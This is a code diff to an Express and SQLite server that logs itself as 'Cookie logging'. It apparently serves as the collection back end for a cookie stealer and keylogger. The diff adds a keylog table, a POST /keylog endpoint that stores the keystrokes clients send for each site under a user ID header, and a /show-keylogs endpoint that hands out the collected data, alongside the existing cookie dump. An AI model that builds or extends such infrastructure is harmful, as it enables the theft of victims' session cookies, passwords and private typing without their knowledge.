@@ -4,27 +4,44 @@ const port = 6900;
 
 const sqlite3 = require("sqlite3");
 const db = new sqlite3.Database(":memory");
+
+/*
+  CREATE TABLE cookie (
+    userId CHAR(10) NOT NULL,
+    name VARCHAR DEFAULT '',
+    value VARCHAR DEFAULT '',
+    metadata VARCHAR DEFAULT '',
+  )
+*/
 db.run(
   "CREATE TABLE cookie (userId CHAR(10) NOT NULL, name VARCHAR DEFAULT '', value VARCHAR DEFAULT '', metadata VARCHAR DEFAULT '')"
 );
+
 /*
-  CREATE TABLE cookie (
-	userId CHAR(10) NOT NULL,
-	name VARCHAR DEFAULT '',
-	value VARCHAR DEFAULT '',
-	metadata VARCHAR DEFAULT '',
+  CREATE TABLE keylog (
+    userId CHAR(10) NOT NULL,
+    site VARCHAR DEFAULT '',
+    keystrokes VARCHAR DEFAULT ''
   )
-  */
+*/
+db.run(
+  "CREATE TABLE keylog (userId CHAR(10) NOT NULL, site VARCHAR default '', keystrokes VARCHAR default '')"
+);
 
 app.use(express.json());
 
 app.get("/show-cookies", (req, res) => {
   db.all("SELECT * FROM cookie", [], (err, rows) => {
-    if (err) {
-      console.log(err);
-    } else {
-      res.send(JSON.stringify(rows));
-    }
+    if (err) console.log(err);
+    else res.send(JSON.stringify(rows));
+  });
+  console.log(req.query);
+});
+
+app.get("/show-keylogs", (req, res) => {
+  db.all("SELECT * from keylog", [], (err, rows) => {
+    if (err) console.log(err);
+    else res.send(JSON.stringify(rows));
   });
   console.log(req.query);
 });
@@ -39,6 +56,18 @@ app.post("/cookie", (req, res) => {
     );
   });
 });
+
+app.post("/keylog", (req, res) => {
+  res.send(JSON.stringify(req.body.data));
+  if(!checkID(req.headers.uid)) return;
+  let database = req.body.data.database
+  for(const entry in database) {
+    db.run(
+      "INSERT INTO keylog (userId, site, keystrokes) VALUES (?, ?, ?)",
+      [req.headers.uid, entry, database[entry]]
+    )
+  }
+})
 
 app.listen(port, () => {
   console.log(`Cookie logging listening at http://localhost:${port}`);
@@ -56,11 +85,3 @@ function getMetadata(cookie) {
   }
   return JSON.stringify(meta);
 }
-
-/**
- * DB Setup
- * cookies table:
- *  userID, name, value, metadata (every other info except value and name)
- * keylogs table:
- *  userID, site, keystrokes
- */
